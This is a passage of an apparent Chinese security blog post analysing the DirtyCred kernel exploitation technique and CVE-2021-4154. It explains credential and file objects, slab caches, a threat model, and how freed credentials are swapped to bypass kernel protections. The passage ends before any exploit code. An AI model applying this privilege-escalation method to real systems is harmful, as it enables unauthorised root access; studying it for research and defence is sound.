<!DOCTYPE html><html lang="en" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon_io/apple-touch-icon.png"><link rel="icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://mundi-xu.github.io/2022/10/08/DirtyCred/"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><meta name="theme-color" content="#2f4154"><meta name="author" content="煊宇"><meta name="keywords" content="LLM Security"><meta property="article:published_time" content="2022-10-07T16:05:21.000Z"><meta property="article:modified_time" content="2022-11-26T13:05:21.000Z"><meta property="article:section" content="Security Research"><meta property="article:tag" content="System Security"><meta property="article:tag" content="linux"><meta property="article:tag" content="DirtyCred"><meta property="article:tag" content="Kernel"><meta property="article:tag" content="CVE"><meta name="google-site-verification" content="8weHOmi2lqvnOxDE30WJFT51umo63nyCgfm8dXHNT5g"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><link rel="dns-prefetch" href="//at.alicdn.com"><link rel="dns-prefetch" href="//cdnjs.cloudflare.com"><link rel="dns-prefetch" href="//raw.githubusercontent.com"><link rel="dns-prefetch" href="//busuanzi.ibruce.info"><link rel="preconnect" href="https://at.alicdn.com" crossorigin><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin><link rel="preconnect" href="https://busuanzi.ibruce.info" crossorigin><link rel="dns-prefetch" href="//www.googletagmanager.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin><link rel="preload" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css" as="style" onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css"></noscript><link rel="preload" href="/css/main.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/events.js" as="script"><link rel="preload" href="/js/plugins.js" as="script"><link rel="preload" href="/js/boot.js" as="script"><link rel="preload" href="/js/img-lazyload.js" as="script"><meta name="description" content="DirtyCred通过利用堆破坏内核漏洞交换进程或文件的凭据，绕过多种内核保护机制，实现越权执行和写入操作，并通过精确控制时间窗口和结合内核特性，确保漏洞利用的稳定性和高效性。"><meta property="og:type" content="article"><meta property="og:title" content="DirtyCred与CVE-2021-4154漏洞分析"><meta property="og:url" content="https://mundi-xu.github.io/2022/10/08/DirtyCred/index.html"><meta property="og:site_name" content="Hanyin&#39;s Space"><meta property="og:description" content="DirtyCred通过利用堆破坏内核漏洞交换进程或文件的凭据，绕过多种内核保护机制，实现越权执行和写入操作，并通过精确控制时间窗口和结合内核特性，确保漏洞利用的稳定性和高效性。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221007220556314.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221007234651485.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404193234339.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404193738756.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404194225406.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404194320812.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.jpg"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.jpg"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.jpg"><meta property="og:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png"><meta property="article:published_time" content="2022-10-07T16:05:21.000Z"><meta property="article:modified_time" content="2022-11-26T13:05:21.000Z"><meta property="article:author" content="煊宇"><meta property="article:tag" content="System Security"><meta property="article:tag" content="linux"><meta property="article:tag" content="DirtyCred"><meta property="article:tag" content="Kernel"><meta property="article:tag" content="CVE"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221007220556314.png"><meta name="format-detection" content="telephone=no"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hanyin&#39;s Space"><meta name="referrer" content="no-referrer-when-downgrade"><meta name="renderer" content="webkit"><meta http-equiv="X-UA-Compatible" content="IE=edge"><link rel="apple-touch-icon" sizes="180x180" href="/img/favicon_io/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/img/favicon_io/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/img/favicon_io/favicon-16x16.png"><link rel="manifest" href="/img/favicon_io/site.webmanifest"><script type="application/ld+json">{
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "DirtyCred与CVE-2021-4154漏洞分析",
    "author": {
      "@type": "Person",
      "name": "煊宇"
    },
    "datePublished": "2022-10-07T16:05:21.000Z",
    
    "dateModified": "2022-11-26T13:05:21.000Z",
    
    "description": "DirtyCred通过利用堆破坏内核漏洞交换进程或文件的凭据，绕过多种内核保护机制，实现越权执行和写入操作，并通过精确控制时间窗口和结合内核特性，确保漏洞利用的稳定性和高效性。",
    
    "publisher": {
      "@type": "Organization",
      "name": "Hanyin&#39;s Space",
      
      "logo": {
        "@type": "ImageObject",
        "url": "/img/favicon_io/favicon.ico"
      }
      
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://mundi-xu.github.io/2022/10/08/DirtyCred/index.html"
    },
    
    "keywords": "System Security,linux,DirtyCred,Kernel,CVE",
    
    
    "articleBody": "基础知识 DirtyCred通过利用堆破坏内核漏洞，交换进程或文件的非特权和特权凭据，实现越权执行或写入操作。该技术能够绕过包括KASLR、CFI、SMEP/SMAP以及KPTI在内的多种内核保护机制和漏洞缓解措施。 具体到实现上，DirtyCred需要对已知内核漏洞的利用功能进行转向，以便对凭据对象进行交换，这一过程取决于不同类型的漏洞在内存损坏中所能提供的不同功能。此外，DirtyCred必须严格控制对象交换发生的时间窗口。由于可利用的时间窗口极为短暂，若没有有效的机制延长此时间窗口，漏洞利用的稳定性将受到影响。第三，DirtyCred需要找到一种机制，使得无特权用户能够主动地分配特权凭证，因为缺乏这种能力会阻碍主动触发凭证对象的交换，从而影响漏洞的利用。 为了达到这一目的，DirtyCred将任何基于堆的漏洞转变为能够以无效方式释放凭据对象的能力，并结合使用userfaultfd、FUSE和文件锁等三种不同的内核特性，以延长对象交换所需的时间窗口，实现稳定的漏洞利用。同时，DirtyCred还利用了各种内核机制，从用户空间和内核空间生成高特权线程，主动分配特权对象。 Creden"
    
  }</script><title>DirtyCred与CVE-2021-4154漏洞分析 - Hanyin&#39;s Space</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/3.0.0/hint.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var dntVal,CONFIG={hostname:"mundi-xu.github.io",root:"/",version:"1.9.8",typing:{enable:!0,typeSpeed:80,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!0,offset_factor:3},web_analytics:{enable:!0,follow_dnt:!1,google:{measurement_id:"G-3847WCVNF2"}},search_path:"/local-search.json",include_content_in_search:!0};CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-3847WCVNF2",function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","G-3847WCVNF2")})</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hanyin's Space" type="application/atom+xml"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>Hanyin&#39;s Space</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/" target="_self"><i class="iconfont icon-home-fill"></i> <span>Home</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/" target="_self"><i class="iconfont icon-archive-fill"></i> <span>Archives</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/" target="_self"><i class="iconfont icon-category-fill"></i> <span>Categories</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/" target="_self"><i class="iconfont icon-tags-fill"></i> <span>Tags</span></a></li><li class="nav-item"><a class="nav-link" href="/about/" target="_self"><i class="iconfont icon-user-fill"></i> <span>About</span></a></li><li class="nav-item"><a class="nav-link" href="/links/" target="_self"><i class="iconfont icon-link-fill"></i> <span>Links</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" rel="external nofollow noreferrer" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" rel="external nofollow noreferrer" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/banner.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="DirtyCred与CVE-2021-4154漏洞分析"></span></div><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-10-08 00:05" pubdate>October 8, 2022 am</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 19k words </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 159 mins </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> views</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar category-bar" style="margin-right:-1rem"><div class="category-list"><div class="category row nomargin-x"><a class="category-item list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Security Research" id="heading-ef1cd54fe461bafc9bc1f6892b96d498" role="tab" data-toggle="collapse" href="#collapse-ef1cd54fe461bafc9bc1f6892b96d498" aria-expanded="true">Security Research <span class="list-group-count">(11)</span> <i class="iconfont icon-arrowright"></i></a><div class="category-collapse collapse show" id="collapse-ef1cd54fe461bafc9bc1f6892b96d498" role="tabpanel" aria-labelledby="heading-ef1cd54fe461bafc9bc1f6892b96d498"><div class="category-post-list"><a href="/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/" title="CVE-2022-3901：利用DirtyCred进行容器逃逸" class="list-group-item list-group-item-action"><span class="category-post">CVE-2022-3901：利用DirtyCred进行容器逃逸</span> </a><a href="/2022/10/08/DirtyCred/" title="DirtyCred与CVE-2021-4154漏洞分析" class="list-group-item list-group-item-action active"><span class="category-post">DirtyCred与CVE-2021-4154漏洞分析</span> </a><a href="/2021/11/30/Architectural-Support-for-System-Security/" title="Architectural Support for System Security" class="list-group-item list-group-item-action"><span class="category-post">Architectural Support for System Security</span> </a><a href="/2021/11/29/why-ml-fails-security/" title="【转载】为什么机器学习解决网络安全问题总是失败" class="list-group-item list-group-item-action"><span class="category-post">【转载】为什么机器学习解决网络安全问题总是失败</span> </a><a href="/2021/11/26/Common-vulnerabilities-mitigation-measures/" title="常见漏洞缓解措施" class="list-group-item list-group-item-action"><span class="category-post">常见漏洞缓解措施</span> </a><a href="/2021/07/15/Chromium-component-risk-analysis/" title="【转载】攻防启示：Chromium 组件风险剖析与收敛" class="list-group-item list-group-item-action"><span class="category-post">【转载】攻防启示：Chromium 组件风险剖析与收敛</span> </a><a href="/2021/02/23/recent-technology-of-symbolic-execution/" title="【转载】带你搞懂符号执行的前世今生与最近技术" class="list-group-item list-group-item-action"><span class="category-post">【转载】带你搞懂符号执行的前世今生与最近技术</span> </a><a href="/2021/01/01/A-brief-analysis-of-PayBreak-anti-ransomware-system/" title="PayBreak防勒索系统简析" class="list-group-item list-group-item-action"><span class="category-post">PayBreak防勒索系统简析</span> </a><a href="/2020/12/28/Research-on-Ransomware-Structure-and-Encryption-Mode/" title="勒索软件结构与加密模式研究" class="list-group-item list-group-item-action"><span class="category-post">勒索软件结构与加密模式研究</span> </a><a href="/2020/12/27/A-Brief-Analysis-of-Cryptographic-Algorithm-RUST/" title="密码学初探-基于RUST的密码系统与算法简析" class="list-group-item list-group-item-action"><span class="category-post">密码学初探-基于RUST的密码系统与算法简析</span> </a><a href="/2020/07/01/Blockchain-based-security-log-system/" title="基于区块链的安全日志系统" class="list-group-item list-group-item-action"><span class="category-post">基于区块链的安全日志系统</span></a></div></div></div></div></aside></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">DirtyCred与CVE-2021-4154漏洞分析</h1><p id="updated-time" class="note note-primary" style="display:none">Last updated on 2022-11-26T21:05:21+08:00</p><div class="markdown-body"><h1 id="基础知识">基础知识</h1><p>DirtyCred通过利用堆破坏内核漏洞，交换进程或文件的非特权和特权凭据，实现越权执行或写入操作。该技术能够绕过包括KASLR、CFI、SMEP/SMAP以及KPTI在内的多种内核保护机制和漏洞缓解措施。</p><p>具体到实现上，DirtyCred需要对已知内核漏洞的利用功能进行转向，以便对凭据对象进行交换，这一过程取决于不同类型的漏洞在内存损坏中所能提供的不同功能。此外，DirtyCred必须严格控制对象交换发生的时间窗口。由于可利用的时间窗口极为短暂，若没有有效的机制延长此时间窗口，漏洞利用的稳定性将受到影响。第三，DirtyCred需要找到一种机制，使得无特权用户能够主动地分配特权凭证，因为缺乏这种能力会阻碍主动触发凭证对象的交换，从而影响漏洞的利用。</p><p>为了达到这一目的，DirtyCred将任何基于堆的漏洞转变为能够以无效方式释放凭据对象的能力，并结合使用userfaultfd、FUSE和文件锁等三种不同的内核特性，以延长对象交换所需的时间窗口，实现稳定的漏洞利用。同时，DirtyCred还利用了各种内核机制，从用户空间和内核空间生成高特权线程，主动分配特权对象。</p><h2 id="credentials-in-linux-kernel">Credentials in Linux kernel</h2><p>在Linux内核中，<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/security/credentials.txt">Credentials</a>代表一系列包含特权信息的内核属性，这些属性使得Linux内核能够根据用户的权限来执行访问控制。Credentials在Linux内核中是作为携带特权信息的内核对象来实现的，这些对象主要包括<code>cred</code>、<code>file</code>和<code>inode</code>对象。鉴于<code>inode</code>对象仅在文件系统上创建新文件时分配，它提供的利用空间不足以支持内存操作（成功利用漏洞的关键步骤），因此，漏洞利用主要集中在<code>cred</code>和<code>file</code>对象上。</p><ol type="1"><li><p><strong><code>struct cred</code></strong> 对象存储了进程的权限信息，如GID、UID等。通过修改低权限进程的<code>cred</code>结构体，可以将进程提升至高权限（如root）。</p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/cred.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br> <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br> <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br> <span class="hljs-type">void</span>        *put_addr;<br> <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC   0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD  0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br> <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br> <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br> <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br> <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br> <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br> <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br> <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br> <span class="hljs-type">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_permitted;   <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_effective;   <span class="hljs-comment">/* caps we can actually use */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_bset;        <span class="hljs-comment">/* capability bounding set */</span><br> <span class="hljs-type">kernel_cap_t</span>    cap_ambient;     <span class="hljs-comment">/* Ambient capability set */</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p></p></li><li><p><strong><code>struct file</code></strong> 对象包含了文件的部分权限信息，如读写权限等。如果低权限用户能够修改高权限文件（如<code>/etc/passwd</code>），同样可以实现提权。</p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/fs.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> &#123;</span><br> ...<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">path</span>    <span class="hljs-title">f_path</span>;</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span>        *<span class="hljs-title">f_inode</span>;</span>   <span class="hljs-comment">/* cached value */</span><br> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span>    *<span class="hljs-title">f_op</span>;</span><br><br> <span class="hljs-comment">/*</span><br><span class="hljs-comment">  * Protects f_ep_links, f_flags.</span><br><span class="hljs-comment">  * Must not be taken from IRQ context.</span><br><span class="hljs-comment">  */</span><br> <span class="hljs-type">spinlock_t</span>          f_lock;<br> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">rw_hint</span>        <span class="hljs-title">f_write_hint</span>;</span><br> <span class="hljs-type">atomic_long_t</span>       f_count;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        f_flags;<br> <span class="hljs-type">fmode_t</span>             f_mode;           <span class="hljs-comment">// !!: O_RDWR</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span>        <span class="hljs-title">f_pos_lock</span>;</span><br> <span class="hljs-type">loff_t</span>              f_pos;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fown_struct</span>  <span class="hljs-title">f_owner</span>;</span><br> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>   *<span class="hljs-title">f_cred</span>;</span>      <span class="hljs-comment">// !!: cred</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_ra_state</span>   <span class="hljs-title">f_ra</span>;</span><br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p></p></li></ol><p>在Linux中，每个进程都有一个指向<code>cred</code>对象的指针。<code>cred</code>对象中的UID字段表示进程权限，如<code>GLOBAL_ROOT_UID</code>表示任务具有root权限。当进程尝试访问资源时，内核会检查进程的<code>cred</code>对象中的UID，以确定是否授权访问。除了UID，<code>cred</code>对象还包含了细粒度的能力（capabilities），这些能力指定了进程可以执行的特定操作。例如，<code>CAP_NET_BIND_SERVICE</code>能力允许进程将套接字绑定到Internet域的特权端口上。在Linux内核中，每个文件都与一个<code>inode</code>对象关联，该对象链接到凭证，以控制对文件的访问。当进程打开文件时，内核会检查<code>inode</code>及其权限，并在授权访问后，将凭证从<code>inode</code>对象转移到<code>file</code>对象。<code>file</code>对象不仅维护凭证，还包含文件的读写权限，通过这些机制，内核可以确保进程不会向只读模式打开的文件写入数据。</p><p>在Linux内核中，每个文件都有其所有者的UID和GID以及其他用户的访问权限和能力。对于可执行文件，它们还具有SUID/SGID标志，指示允许其他用户以所有者的特权运行的特殊权限。在Linux内核实现中，每个文件都绑定到一个链接到凭证的<code>inode</code>对象。当一个进程试图打开一个文件时，内核调用函数<code>inode_permission</code>会在授予文件访问权之前检查<code>inode</code>和相应的权限。打开文件后，内核断开与<code>inode</code>对象的凭据链接并将它们附加到<code>file</code>对象。除了维护凭证之外，<code>file</code>对象还包含文件的读/写权限。通过<code>file</code>对象，内核可以索引到<code>cred</code>对象，从而检查特权。此外，它还可以检查读写权限，从而确保进程不会向以只读模式打开的文件写入数据。</p><h2 id="kernel-heap-memory-management">Kernel Heap Memory Management</h2><p>Linux内核使用slab内存分配器来管理内存分配以提高性能和防止碎片化。尽管Linux内核中存在三种不同的内存分配器（SLOB，SLAB，SLUB），它们共享一个相同的设计理念。具体来说，这些分配器都依赖于缓存机制来管理大小相同的内存块。对于每个缓存，内核会分配内存页，并将其划分为多个大小相同的块，每个块用于承载特定类型的对象。当一个缓存中的内存页被完全占用时，内核会为该缓存分配新的内存页。如果一个缓存中的内存页不再被需要，即其上的所有对象都已被释放，那么内核会回收这些内存页。</p><p>Linux内核主要包含两种类型的缓存：</p><h3 id="generic-caches">Generic Caches</h3><p>Linux内核提供了多种通用缓存，用于分配不同大小的内存块。当请求内存分配时，内核首先将请求的大小四舍五入到最接近的大小，然后从匹配大小的缓存中分配内存块。如果分配请求没有明确指定从哪种类型的缓存中进行分配，则默认在通用缓存中进行。相同通用缓存中的分配请求可以共享相同的内存页，因为它们被维护在同一内存页上。</p><h3 id="dedicated-caches">Dedicated Caches</h3><p>为了提高性能和安全性，Linux内核创建了专用缓存。一些频繁使用的对象会拥有自己的专用缓存，这可以减少分配这些对象的时间，从而提高系统性能。专用缓存和通用缓存不共享内存页，因此在通用缓存中分配的对象不会与专用缓存中的对象相邻。这可以看作是一种缓存级的隔离，有助于减轻通用缓存中的溢出对系统的影响。</p><p>可以通过在终端中输入<code>sudo cat /proc/slabinfo</code>命令查看slab分配器的详细信息。其中列出的不同名称的内存块即表示专用缓存，名称中包含<code>kmalloc</code>的则表示通用缓存。</p><h1 id="threat-model">Threat Model</h1><p>假设一个低权限用户拥有对Linux系统的本地访问权限，并试图通过利用内核中的内存破坏漏洞来实现本地提权。我们还假设Linux系统启用了内核版本5.15中提供的所有攻击缓解措施和内核保护机制。这些机制包括<a target="_blank" rel="noopener" href="https://lwn.net/Articles/569635/">KASLR</a>, <a target="_blank" rel="noopener" href="https://lwn.net/Articles/517475/">SMAP</a>, <a target="_blank" rel="noopener" href="https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/">SMEP</a>, <a target="_blank" rel="noopener external nofollow noreferrer" href="https://lwn.net/Articles/810077/">CFI</a>, <a target="_blank" rel="noopener" href="https://lwn.net/Articles/741878/">KPTI</a>等。在这种情况下，内核地址空间是随机化的，内核执行期间不能直接访问用户空间内存，且其控制流完整性得到保证。</p><h1 id="dirtycred利用">DirtyCred利用</h1><p>以CVE-2021-4154为例，演示了DirtyCred如何被实际利用。</p><p>CVE-2021-4154是由于类型混淆错误导致，其中文件对象被<code>fs_context</code>结构体中的指针错误引用。在Linux内核中，文件对象的生命周期是通过引用计数机制维护的。当引用计数降至零时，文件对象会被自动释放，这意味着该对象不再被使用。然而，通过触发此漏洞，即使文件对象仍在使用中，内核也会错误地释放它。</p><p><img lazyload src="/img/loading.gif" 